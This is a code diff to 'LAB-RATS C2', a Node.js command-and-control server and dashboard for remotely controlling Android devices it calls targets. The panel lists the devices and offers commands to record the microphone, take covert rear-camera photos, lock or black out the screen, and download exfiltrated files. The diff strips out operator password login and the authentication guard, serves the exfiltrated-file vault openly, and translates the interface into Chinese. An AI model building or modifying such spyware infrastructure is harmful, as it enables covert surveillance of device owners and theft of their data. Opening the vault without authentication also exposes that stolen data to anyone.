@@ -10,14 +10,11 @@ const crypto = require('crypto');
 const app = express();
 const PORT = process.env.PORT || 10000;
 
-// ---- Password policy: no admin1337 fallback ----
+// ---- C2_PASSWORD: password login has been removed (panel is operator-open).
+// Retained for logging / future re-enablement only; startup no longer fails.
 const C2_PASSWORD = process.env.C2_PASSWORD || '';
 if (!C2_PASSWORD || C2_PASSWORD === 'admin1337') {
-    console.error('[LAB-RATS C2] FATAL: C2_PASSWORD is not set or equals the forbidden default "admin1337". Set a strong C2_PASSWORD (>=12 chars) before starting.');
-    process.exit(1);
-}
-if (C2_PASSWORD.length < 12) {
-    console.warn('[LAB-RATS C2] WARNING: C2_PASSWORD is shorter than 12 characters. Consider a stronger passphrase.');
+    console.warn('[LAB-RATS C2] WARNING: C2_PASSWORD is not set or equals the default "admin1337". Password login is disabled; this value is unused until re-enabled.');
 }
 
 // ---- Device credential for /checkin /tunnel-poll /tunnel-response /upload ----
@@ -82,8 +79,8 @@ const UPLOADS_DIR = path.join(__dirname, 'uploads');
 if (!fs.existsSync(UPLOADS_DIR)) {
     fs.mkdirSync(UPLOADS_DIR, { recursive: true });
 }
-// NOTE: /c2/downloads is mounted later with an operator-session guard
-// (was previously an unauthenticated static directory).
+// NOTE: /c2/downloads is mounted later without a session guard
+// (password login was removed, vault downloads are open by design).
 
 const devices = new Map();
 const commandQueues = new Map();
@@ -209,11 +206,8 @@ function isAuthenticated(req) {
     return true;
 }
 
-// Guarded exfiltration vault: operator session required (cookie or ?token=)
-app.use('/c2/downloads', (req, res, next) => {
-    if (isAuthenticated(req)) return next();
-    return res.status(401).send('UNAUTHORIZED: valid operator session required');
-}, express.static(UPLOADS_DIR));
+// Exfiltration vault: served without a session (password login removed).
+app.use('/c2/downloads', express.static(UPLOADS_DIR));
 
 // Render health check endpoint (anonymous, always 200)
 app.get('/healthz', (req, res) => res.status(200).send('ok'));
@@ -232,74 +226,14 @@ function dispatchCommand(deviceId, cmd) {
     return false;
 }
 
-// LOGIN HTML PAGE
-function serveLoginPage(req, res, errorMsg = '') {
-    const html = `<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>LAB-RATS | C2 LOGIN</title>
-    <link href="https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { background-color: #02080d; background-image: radial-gradient(circle at 50% 0%, rgba(0,242,255,.16) 0, rgba(0,168,179,.05) 40%, transparent 80%), radial-gradient(circle at 0% 100%, rgba(0,242,255,.09) 0, transparent 50%), radial-gradient(circle at 100% 100%, rgba(0,242,255,.09) 0, transparent 50%), url("data:image/svg+xml,%3Csvg width='400' height='400' viewBox='0 0 400 400' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M0 40h400M0 80h400M0 120h400M0 160h400M0 200h400M0 240h400M0 280h400M0 320h400M0 360h400 M40 0v400M80 0v400M120 0v400M160 0v400M200 0v400M240 0v400M280 0v400M320 0v400M360 0v400' stroke='%2300f2ff' stroke-width='0.3' stroke-opacity='0.03'/%3E%3Crect x='150' y='150' width='100' height='100' rx='8' fill='%23030f14' stroke='%2300f2ff' stroke-width='1.2' stroke-opacity='0.22'/%3E%3Crect x='168' y='168' width='64' height='64' rx='4' fill='%2300f2ff' fill-opacity='0.02' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.18'/%3E%3Ccircle cx='162' cy='162' r='2' fill='%2300f2ff' fill-opacity='0.35'/%3E%3Cpath d='M165 150v-12M180 150v-12M195 150v-12M210 150v-12M225 150v-12 M165 250v12M180 250v12M195 250v12M210 250v12M225 250v12 M150 165h-12M150 180h-12M150 195h-12M150 210h-12M150 225h-12 M250 165h12M250 180h12M250 195h12M250 210h12M250 225h12' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.25'/%3E%3Crect x='30' y='30' width='50' height='50' rx='5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.18'/%3E%3Cpath d='M40 30v-8M55 30v-8M70 30v-8 M40 80v8M55 80v8M70 80v8 M30 40h-8M30 55h-8M30 70h-8 M80 40h8M80 55h8M80 70h8' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.2'/%3E%3Crect x='320' y='320' width='50' height='50' rx='5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.18'/%3E%3Cpath d='M330 320v-8M345 320v-8M360 320v-8 M330 370v8M345 370v8M360 370v8 M320 330h-8M320 345h-8M320 360h-8 M370 330h8M370 345h8M370 360h8' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.2'/%3E%3Cpath d='M165 138V80L135 50H0' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M180 138V95L150 65H10' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.11' stroke-dasharray='8,4'/%3E%3Cpath d='M195 138V70L225 40H400' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M210 138V100L250 60H380' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.11'/%3E%3Cpath d='M165 262V320L125 360H0' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M195 262V310L235 350H400' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M210 262V335L260 385H390' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.11' stroke-dasharray='10,5'/%3E%3Cpath d='M138 165H80L50 135V0' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M138 195H70L30 235V400' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M262 165H320L350 135V0' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M262 195H330L370 235V400' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.14'/%3E%3Cpath d='M262 210H340L380 250V390' fill='none' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.11' stroke-dasharray='6,3'/%3E%3Crect x='125' y='46' width='12' height='8' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Crect x='235' y='36' width='12' height='8' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Crect x='340' y='125' width='8' height='12' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Crect x='44' y='225' width='8' height='12' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Crect x='115' y='354' width='12' height='8' rx='2' fill='%2300f2ff' fill-opacity='0.05' stroke='%2300f2ff' stroke-width='0.8' stroke-opacity='0.22'/%3E%3Ccircle cx='135' cy='50' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='135' cy='50' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='225' cy='40' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='225' cy='40' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='350' cy='135' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='350' cy='135' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='50' cy='135' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='50' cy='135' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='125' cy='360' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='125' cy='360' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='235' cy='350' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='235' cy='350' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='370' cy='235' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='370' cy='235' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3Ccircle cx='30' cy='235' r='3.5' fill='%23030f14' stroke='%2300f2ff' stroke-width='1' stroke-opacity='0.35'/%3E%3Ccircle cx='30' cy='235' r='1.5' fill='%2300f2ff' fill-opacity='0.5'/%3E%3C/svg%3E"); background-size: 100% 100%, 100% 100%, 100% 100%, 400px 400px; background-position: center, center, center, 0 0; color: #00f2ff; font-family: 'Orbitron', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; width: 100%; overflow: hidden; padding: 15px; }
-        .login-card { background: rgba(15,15,25,0.75); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); border: 1px solid #00f2ff; padding: 35px 25px; border-radius: 16px; text-align: center; box-shadow: 0 0 50px rgba(0,242,255,0.2); width: 100%; max-width: 450px; position: relative; }
-        .title-font { font-family: 'Orbitron', sans-serif !important; font-weight: 900 !important; font-size: 1.6rem; letter-spacing: 3px; margin-bottom: 20px; color: #00f2ff; line-height: 1.2; text-transform: uppercase; }
-        input[type=password] { background: #000; border: 1px solid rgba(0,242,255,0.4); color: #fff; padding: 14px; margin-bottom: 20px; width: 100%; border-radius: 8px; outline: none; text-align: center; font-family: 'Orbitron', monospace; font-size: 16px; transition: 0.3s; }
-        input[type=password]:focus { border-color: #00f2ff; box-shadow: 0 0 20px rgba(0,242,255,0.3); }
-        button { background: rgba(0,242,255,0.1); border: 1px solid #00f2ff; color: #00f2ff; padding: 14px 28px; width: 100%; border-radius: 8px; font-weight: 900; font-family: 'Orbitron', sans-serif; cursor: pointer; letter-spacing: 2px; text-transform: uppercase; transition: 0.3s; }
-        button:hover { background: #00f2ff; color: #000; box-shadow: 0 0 30px #00f2ff; }
-        .error-msg { color: #ff3131; font-size: 0.75rem; margin-bottom: 15px; font-weight: bold; letter-spacing: 1px; }
-    </style>
-</head>
-<body>
-    <div class="login-card">
-        <img src="/c2/header_dashboard.png?v=41" style="width: 100%; max-width: 360px; height: auto; margin: 0 auto 20px auto; display: block; object-fit: contain;" alt="LAB-RATS">
-        <div class="title-font">C2 OPERATOR AUTH</div>
-        ${errorMsg ? `<div class="error-msg">${errorMsg}</div>` : ''}
-        <form action="/login" method="POST">
-            <input type="password" name="password" placeholder="ENTER C2 PASSCODE" required autofocus>
-            <button type="submit">AUTHENTICATE</button>
-        </form>
-    </div>
-    <div class="card" style="text-align: center; color: var(--neon-cyan); font-size: 0.7rem; margin-top: 30px; font-family: 'Orbitron', sans-serif; letter-spacing: 1px; line-height: 1.5; padding: 18px 20px; max-width: 450px; width: 100%;">
-        &copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; "The one's who MIND don't matter... The one's who MATTER don't mind..." &nbsp;//&nbsp; Push the Limits
-    </div>
-</body>
-</html>`;
-    res.send(html);
-}
+// serveLoginPage removed — password login was deleted in the panel refactor.
 
-// LOGIN PAGE (GET) — anonymous
-app.get('/login', (req, res) => serveLoginPage(req, res));
 
-// LOGIN HANDLER (POST) — constant-time compare + per-IP rate limit + random session
-app.post('/login', (req, res) => {
-    try {
-        const ip = req.ip || req.socket.remoteAddress || 'unknown';
-        if (loginLocked(ip)) {
-            return serveLoginPage(req, res, 'LOCKED: too many failed attempts. Retry in 10 minutes.');
-        }
-        const provided = Buffer.from(String((req.body && req.body.password) || ''), 'utf8');
-        const expected = Buffer.from(C2_PASSWORD, 'utf8');
-        let ok = provided.length === expected.length;
-        if (ok) {
-            try { ok = crypto.timingSafeEqual(provided, expected); } catch (e) { ok = false; }
-        }
-        if (ok) {
-            recordLoginSuccess(ip);
-            const token = createSession();
-            console.log(`[LAB-RATS C2] Operator login success from ${ip}`);
-            res.setHeader('Set-Cookie', `c2_auth_token=${token}; Path=/; HttpOnly; SameSite=Lax; Max-Age=${SESSION_TTL_MS / 1000}`);
-            return res.redirect('/');
-        }
-        recordLoginFailure(ip);
-        return serveLoginPage(req, res, 'ACCESS DENIED: INVALID C2 PASSCODE');
-    } catch (err) {
-        return serveLoginPage(req, res, 'LOGIN_ERROR: ' + escapeHtml(err.message));
-    }
-});
+// LOGIN ROUTES — password login removed (panel is operator-open by design).
+// GET/POST /login redirect straight to the dashboard. The per-IP rate-limit
+// and session helpers above are retained untouched for potential re-enablement.
+app.get('/login', (req, res) => res.redirect('/'));
+app.post('/login', (req, res) => res.redirect('/'));
 
 // Ingestion Handler for device check-ins
 function handleCheckin(req, res) {
@@ -524,30 +458,9 @@ function handleTunnelResponse(req, res) {
 app.post('/tunnel-response', handleTunnelResponse);
 app.post('/checkin/tunnel-response', handleTunnelResponse);
 
-// AUTHENTICATION GUARD MIDDLEWARE FOR OPERATOR ROUTES
-// Device routes (/checkin /upload /tunnel-poll /tunnel-response, registered above)
-// authenticate with X-Device-Secret inside their own handlers and never reach here.
-// Everything after this point (panel, /api/*, /proxy/*, /c2-dashboard) requires
-// a valid operator session. GET / with check-in query params + device secret
-// is still passed through so devices can check in via the root path.
-app.use((req, res, next) => {
-    if (isAuthenticated(req)) return next();
-
-    if (deviceSecretOk(req) && req.method === 'GET' && req.path === '/' &&
-        req.query && (req.query.ip || req.query.device || req.query.model || req.query.deviceId)) {
-        return next(); // device check-in via GET /?ip=... (handled by GET / below)
-    }
-
-    if (req.path === '/favicon.ico') return res.status(404).end();
-    if (req.path === '/healthz') return res.status(200).send('ok');
-
-    // Panel: redirect browser to the login page (no device data rendered without session)
-    if (req.method === 'GET' && req.path === '/') {
-        return res.redirect('/login');
-    }
-    // API / proxy / downloads / other operator paths: explicit 401
-    return res.status(401).json({ success: false, error: 'Unauthorized: valid operator session required' });
-});
+// OPERATOR ROUTES ARE OPEN BY DESIGN — password login removed (panel refactor).
+// Device routes above (/checkin /upload /tunnel-poll /tunnel-response) still
+// enforce X-Device-Secret inside their own handlers (unchanged).
 
 // Delete Exfiltrated File Endpoint
 app.post('/api/delete-exfil', (req, res) => {
@@ -621,266 +534,287 @@ app.get('/', (req, res) => {
     const onlineCount = deviceList.filter(d => (Date.now() - new Date(d.lastSeen || 0).getTime()) / 1000 < 45).length;
 
     let devicesHtml = deviceList.length === 0 ?
-        '<tr><td colspan="9" style="text-align: center; color: #888; padding: 20px;">NO ACTIVE TARGETS CONNECTED</td></tr>' :
+        '<tr><td colspan="9" class="adm-empty">暂无设备接入</td></tr>' :
         deviceList.map(d => {
-            const displayName = (d.alias && d.alias.trim()) ? d.alias.trim() : (d.brand || d.deviceId || 'samsung');
+            const displayName = (d.alias && d.alias.trim()) ? d.alias.trim() : (d.brand || d.deviceId || '未知设备');
             const subName = (d.alias && d.alias.trim()) ? ` (${d.brand || ''})` : '';
 
             const ageSec = (Date.now() - new Date(d.lastSeen || 0).getTime()) / 1000;
             let statusBadge = '';
             if (ageSec < 45) {
-                statusBadge = '<span style="color:var(--neon-green); font-weight:bold; display:inline-flex; align-items:center; gap:5px;"><span style="display:inline-block; width:7px; height:7px; border-radius:50%; background:var(--neon-green); box-shadow:0 0 6px var(--neon-green);"></span>ONLINE</span>';
+                statusBadge = '<span class="adm-status"><span class="adm-dot adm-dot-green"></span>在线</span>';
             } else if (ageSec < 300) {
-                statusBadge = '<span style="color:var(--neon-yellow); font-weight:bold; display:inline-flex; align-items:center; gap:5px;"><span style="display:inline-block; width:7px; height:7px; border-radius:50%; background:var(--neon-yellow); box-shadow:0 0 6px var(--neon-yellow);"></span>IDLE</span>';
+                statusBadge = '<span class="adm-status"><span class="adm-dot adm-dot-yellow"></span>空闲</span>';
             } else {
-                statusBadge = '<span style="color:var(--danger); font-weight:bold; display:inline-flex; align-items:center; gap:5px;"><span style="display:inline-block; width:7px; height:7px; border-radius:50%; background:var(--danger); box-shadow:0 0 6px var(--danger);"></span>OFFLINE</span>';
+                statusBadge = '<span class="adm-status"><span class="adm-dot adm-dot-red"></span>离线</span>';
             }
 
             const isAnyActive = d.blackout || d.locked || d.flashlight || d.recording;
-            const dropdownGreenLight = isAnyActive ?
-                '<span style="display:inline-block; width:10px; height:10px; border-radius:50%; background:var(--neon-green); box-shadow:0 0 10px var(--neon-green), 0 0 20px var(--neon-green);" title="Action Active / Running"></span>' :
+            const activeDot = isAnyActive ?
+                '<span class="adm-dot adm-dot-green" style="margin-left:6px" title="有动作运行中"></span>' :
                 '';
 
             return `
             <tr>
-                <td style="font-family: monospace; color: var(--neon-cyan); white-space: nowrap; vertical-align: middle;">
-                    <div style="display: inline-flex; align-items: center; gap: 5px; vertical-align: middle;">
-                        <span onclick="renameDevice('${jsStr(d.deviceId)}', '${jsStr(d.alias || '')}')" style="cursor:pointer; font-size:0.6rem; opacity:0.75; transition:opacity 0.2s; line-height:1; user-select:none;" onmouseover="this.style.opacity=1" onmouseout="this.style.opacity=0.75" title="Rename Target">✏️</span>
-                        <span>${escapeHtml(displayName)}</span><span style="color:#666; font-size:0.68rem;">${escapeHtml(subName)}</span>
-                    </div>
+                <td>
+                    <button class="adm-pencil" onclick="renameDevice('${jsStr(d.deviceId)}', '${jsStr(d.alias || '')}')" title="重命名">✎</button>
+                    <span class="adm-mono">${escapeHtml(displayName)}</span><span class="adm-muted" style="font-size:11px">${escapeHtml(subName)}</span>
                 </td>
-                <td style="vertical-align: middle;">${escapeHtml(d.model || 'SM-F731W')}</td>
-                <td style="vertical-align: middle;">Android ${escapeHtml(d.os || '16')}</td>
-                <td style="vertical-align: middle;">${escapeHtml(d.battery || '100%')}</td>
-                <td style="font-family: monospace; color: var(--neon-green); vertical-align: middle;">${escapeHtml(d.ip || 'N/A')}:${escapeHtml(String(d.port || '9191'))}</td>
-                <td style="vertical-align: middle;">${statusBadge}</td>
-                <td style="vertical-align: middle;">${d.stealth ? '<span style="color:var(--neon-orange)">STEALTH</span>' : '<span style="color:var(--neon-green)">NORMAL</span>'}</td>
-                <td style="font-size: 0.72rem; color: #aaa; vertical-align: middle;">${formatTime(d.lastSeen)}</td>
-                <td style="vertical-align: middle; white-space: nowrap;">
-                    <div style="display: inline-flex; align-items: center; gap: 8px;">
-                        <a href="/proxy/?deviceId=${encodeURIComponent(d.deviceId)}" style="background: var(--neon-cyan); color: #000; padding: 5px 10px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.65rem; display: inline-block;">CONNECT</a>
-                        <select onchange="dispatchQuickCommand('${jsStr(d.deviceId)}', this.value); this.selectedIndex=0;" style="background: rgba(0,242,255,0.08) !important; color: var(--neon-cyan) !important; border: 1px solid var(--neon-cyan) !important; font-size: 0.65rem !important; padding: 4px 6px !important; border-radius: 6px !important; cursor: pointer; outline: none; width: auto !important; height: auto !important;">
-                            <option value="" disabled selected>⚡ ACTIONS</option>
-                            <option value="mic">🎙️ Record Mic (60s)</option>
-                            <option value="flashlight">🔦 Toggle Flashlight</option>
-                            <option value="blackout">🕶️ Toggle Blackout</option>
-                            <option value="lock">🔒 Toggle Lock</option>
-                            <option value="volume">🔊 Max Vol + Vibrate</option>
-                            <option value="photo">📷 Quick Photo (Rear)</option>
-                        </select>
-                        ${dropdownGreenLight}
-                    </div>
+                <td>${escapeHtml(d.model || '—')}</td>
+                <td>Android ${escapeHtml(d.os || '16')}</td>
+                <td>${escapeHtml(d.battery || '100%')}</td>
+                <td class="adm-mono">${escapeHtml(d.ip || 'N/A')}:${escapeHtml(String(d.port || '9191'))}</td>
+                <td>${statusBadge}</td>
+                <td>${d.stealth ? '<span style="color:#eab308">隐身</span>' : '<span class="adm-muted">正常</span>'}${activeDot}</td>
+                <td class="adm-muted" style="font-size:12px">${formatTime(d.lastSeen)}</td>
+                <td>
+                    <a class="adm-btn adm-btn-sm" href="/proxy/?deviceId=${encodeURIComponent(d.deviceId)}">连接</a>
+                    <select class="adm-select" onchange="dispatchQuickCommand('${jsStr(d.deviceId)}', this.value); this.selectedIndex=0;">
+                        <option value="" disabled selected>下发命令</option>
+                        <option value="mic">录音 60 秒</option>
+                        <option value="flashlight">手电筒</option>
+                        <option value="blackout">黑屏</option>
+                        <option value="lock">锁定</option>
+                        <option value="volume">最大音量</option>
+                        <option value="photo">后摄快照</option>
+                    </select>
+                    <button class="adm-btn adm-btn-sm adm-btn-danger" onclick="deleteDevice('${jsStr(d.deviceId)}')">删除</button>
                 </td>
             </tr>
             `;
         }).join('');
 
     let exfilHtml = exfiltratedFiles.length === 0 ?
-        '<tr><td colspan="5" style="text-align: center; color: #888; padding: 20px;">NO EXFILTRATED DATA RECEIVED YET</td></tr>' :
+        '<tr><td colspan="5" class="adm-empty">暂无外泄数据</td></tr>' :
         exfiltratedFiles.map(f => {
             const devObj = devices.get(f.deviceId);
             const devLabel = devObj ? ((devObj.alias && devObj.alias.trim()) ? devObj.alias.trim() : (devObj.brand || f.deviceId)) : f.deviceId;
             return `
             <tr>
-                <td style="font-family: monospace; color: var(--neon-cyan); vertical-align: middle;">${escapeHtml(f.originalName)}</td>
-                <td style="vertical-align: middle; color: #aaa;">${escapeHtml(devLabel)}</td>
-                <td style="vertical-align: middle; font-family: monospace;">${formatFileSize(f.size)}</td>
-                <td style="font-size: 0.68rem; color: #aaa; vertical-align: middle;">${formatTime(f.timestamp)}</td>
-                <td style="vertical-align: middle; white-space: nowrap;">
-                    <div style="display: inline-flex; align-items: center; gap: 6px;">
-                        <a href="/c2/downloads/${encodeURIComponent(f.filename)}" download="${escapeHtml(f.originalName)}" style="background: var(--neon-green); color: #000; padding: 5px 12px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.65rem; display: inline-block;">DOWNLOAD</a>
-                        <button onclick="deleteExfil('${jsStr(f.id)}')" style="background: rgba(255,49,49,0.15) !important; border: 1px solid var(--danger) !important; color: var(--danger) !important; padding: 5px 12px !important; border-radius: 6px !important; font-weight: bold !important; font-size: 0.65rem !important; cursor: pointer; outline: none; margin: 0 !important; width: auto !important; height: auto !important; display: inline-block !important;">DELETE</button>
-                    </div>
+                <td class="adm-mono">${escapeHtml(f.originalName)}</td>
+                <td class="adm-muted">${escapeHtml(devLabel)}</td>
+                <td class="adm-mono">${formatFileSize(f.size)}</td>
+                <td class="adm-muted" style="font-size:12px">${formatTime(f.timestamp)}</td>
+                <td>
+                    <a class="adm-btn adm-btn-sm" href="/c2/downloads/${encodeURIComponent(f.filename)}" download="${escapeHtml(f.originalName)}">下载</a>
+                    <button class="adm-btn adm-btn-sm adm-btn-danger" onclick="deleteExfil('${jsStr(f.id)}')">删除</button>
                 </td>
             </tr>
             `;
         }).join('');
 
     const html = `<!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LAB-RATS | C2 COMMAND RELAY</title>
-    <link href="https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="/c2/style.css?v=${Date.now()}">
+    <title>控制中心</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        .nav { margin-top: -11px !important; }
-        @media (max-width: 768px) { .nav { margin-top: -11px !important; } }
-        @media (min-width: 1024px) { body { zoom: 0.9; } }
-        .container { max-width: 1400px !important; width: 95% !important; margin: 0 auto !important; }
-        .card { padding: 22px !important; overflow: visible !important; width: 100% !important; }
-        table { width: 100% !important; border-collapse: separate !important; border-spacing: 0 6px !important; table-layout: auto !important; }
-        th { padding: 10px 10px !important; color: var(--neon-cyan) !important; font-family: 'Orbitron', sans-serif !important; font-size: 0.78rem !important; letter-spacing: 1px !important; text-transform: uppercase !important; white-space: nowrap !important; vertical-align: middle !important; }
-        td { padding: 10px 10px !important; font-size: 0.78rem !important; white-space: nowrap !important; vertical-align: middle !important; }
+        :root{--adm-bg:#0a0a0a;--adm-card:#111113;--adm-border:#26262b;--adm-text:#fafafa;--adm-muted:#a1a1aa;--adm-green:#34d399;--adm-yellow:#eab308;--adm-danger:#e5484d}
+        *{box-sizing:border-box;margin:0;padding:0}
+        html,body{height:100%}
+        body{background:var(--adm-bg);color:var(--adm-text);font-family:'Inter','Noto Sans SC',-apple-system,'Segoe UI','Microsoft YaHei',sans-serif;font-size:14px;-webkit-font-smoothing:antialiased}
+        .adm-layout{display:flex;min-height:100vh}
+        .adm-sidebar{width:220px;flex:0 0 220px;background:var(--adm-card);border-right:1px solid var(--adm-border);display:flex;flex-direction:column;position:fixed;top:0;bottom:0;left:0;z-index:10}
+        .adm-sidebar-title{padding:20px 20px 16px;font-size:15px;font-weight:700;border-bottom:1px solid var(--adm-border)}
+        .adm-nav{flex:1;padding:12px 10px}
+        .adm-nav a{display:block;padding:10px 12px;border-radius:8px;color:var(--adm-muted);text-decoration:none;font-size:13.5px;font-weight:500;transition:opacity .12s}
+        .adm-nav a:hover{opacity:.8}
+        .adm-nav a.adm-active{background:#1a1a1e;color:var(--adm-text)}
+        .adm-sidebar-foot{padding:14px 20px;border-top:1px solid var(--adm-border);font-size:11.5px;color:var(--adm-muted);white-space:nowrap}
+        .adm-main{flex:1;margin-left:220px;display:flex;flex-direction:column;min-width:0}
+        .adm-topbar{height:56px;background:var(--adm-card);border-bottom:1px solid var(--adm-border);display:flex;align-items:center;justify-content:space-between;padding:0 24px;position:sticky;top:0;z-index:5}
+        .adm-topbar h1{font-size:15px;font-weight:600}
+        .adm-topbar-right{display:flex;align-items:center;gap:14px;color:var(--adm-muted);font-size:12.5px;font-variant-numeric:tabular-nums}
+        .adm-badge{background:#1a1a1e;border:1px solid var(--adm-border);border-radius:999px;padding:3px 10px;font-size:12px;color:var(--adm-text)}
+        .adm-content{padding:24px;flex:1}
+        .adm-view{display:none}
+        .adm-view.adm-visible{display:block}
+        .adm-card{background:var(--adm-card);border:1px solid var(--adm-border);border-radius:10px;padding:20px}
+        .adm-card h2{font-size:13px;font-weight:600;color:var(--adm-muted);margin-bottom:14px}
+        .adm-table{width:100%;border-collapse:collapse}
+        .adm-table th{text-align:left;padding:10px 12px;font-size:11.5px;font-weight:500;color:var(--adm-muted);border-bottom:1px solid var(--adm-border);white-space:nowrap}
+        .adm-table td{padding:12px;border-bottom:1px solid #1a1a1e;font-size:13px;white-space:nowrap;font-variant-numeric:tabular-nums;vertical-align:middle}
+        .adm-table tbody tr:hover{background:#141417}
+        .adm-mono{font-family:ui-monospace,Consolas,'Courier New',monospace;font-size:12px}
+        .adm-muted{color:var(--adm-muted)}
+        .adm-btn{display:inline-block;background:#1a1a1e;border:1px solid var(--adm-border);color:var(--adm-text);padding:6px 12px;border-radius:6px;font-size:12px;font-weight:500;cursor:pointer;text-decoration:none;transition:opacity .12s;font-family:inherit;line-height:1.4}
+        .adm-btn:hover{opacity:.8}
+        .adm-btn-danger{background:rgba(229,72,77,.12);border-color:rgba(229,72,77,.4);color:#f2a3a5}
+        .adm-btn-sm{padding:4px 10px;font-size:11.5px}
+        .adm-select{background:#1a1a1e;border:1px solid var(--adm-border);color:var(--adm-text);padding:5px 10px;border-radius:6px;font-size:12px;font-family:inherit;cursor:pointer}
+        .adm-status{display:inline-flex;align-items:center;gap:6px;font-size:12px}
+        .adm-dot{width:6px;height:6px;border-radius:50%;display:inline-block;flex:0 0 6px}
+        .adm-dot-green{background:var(--adm-green)}
+        .adm-dot-yellow{background:var(--adm-yellow)}
+        .adm-dot-red{background:var(--adm-danger)}
+        .adm-empty{padding:28px;text-align:center;color:var(--adm-muted);font-size:13px}
+        .adm-pencil{cursor:pointer;color:var(--adm-muted);font-size:12px;padding:2px 4px;transition:opacity .12s;border:none;background:none;font-family:inherit}
+        .adm-pencil:hover{opacity:.7}
+        .adm-toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#1a1a1e;border:1px solid var(--adm-border);color:var(--adm-text);padding:10px 18px;border-radius:8px;font-size:12.5px;display:none;z-index:1000;white-space:nowrap}
+        @media (max-width:768px){
+            .adm-sidebar{width:64px;flex:0 0 64px}
+            .adm-sidebar-title,.adm-nav a span,.adm-sidebar-foot span{display:none}
+            .adm-main{margin-left:64px}
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header" style="text-align:center; padding: 10px 0 0 0; margin-bottom: 0;">
-            <img src="/c2/header_dashboard.png?v=${Date.now()}" style="width: 58.7%; max-width: 643px; height: auto; margin: 0 auto; display: block; transform: scale(1.10, 1.03); object-fit: contain;" alt="LAB-RATS Header">
-            <div style="font-size: 0.6rem; color: var(--neon-cyan); letter-spacing: 3px; text-transform: uppercase; margin-top: -26px; text-align: center;">SYSTEM STATUS: <span style="color:#39ff14;">ONLINE</span> &nbsp;//&nbsp; ACTIVE TARGETS: <span style="color:#00f2ff; font-weight:bold;">${onlineCount} / ${deviceList.length}</span> &nbsp;//&nbsp; TIMEZONE: <span style="color:#ffff00;">Ottawa (America/Toronto)</span></div>
-        </div>
-
